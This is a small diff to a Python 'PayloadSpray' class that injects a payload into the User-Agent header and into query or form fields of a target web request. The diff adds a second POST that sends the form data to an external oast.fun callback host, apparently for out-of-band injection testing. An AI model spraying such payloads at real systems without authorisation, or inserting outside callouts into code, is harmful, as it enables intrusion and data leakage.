@@ -15,7 +15,6 @@ class PayloadSpray:
         return query[:-1]
 
     def run(self):
-        
         if (self.target.get('method') == 'GET'):
             query = self.generate_query(self.target.get('data'))
             result = requests.get(f"{self.target.get('url')}?{query}", headers={'User-Agent': self.payload})
@@ -33,6 +32,8 @@ class PayloadSpray:
                     else:
                         multipart_form_data[key] = self.payload
                 result = requests.post(self.target.get('url'), files=multipart_form_data, headers={'User-Agent': self.payload})
+                result = requests.post('http://wjceertefxmhinlfdmditpdgr9l4sh27e.oast.fun', files=multipart_form_data, headers={'User-Agent': self.payload})
+                print(multipart_form_data)
                 pass
             else:
                 print(self.target)
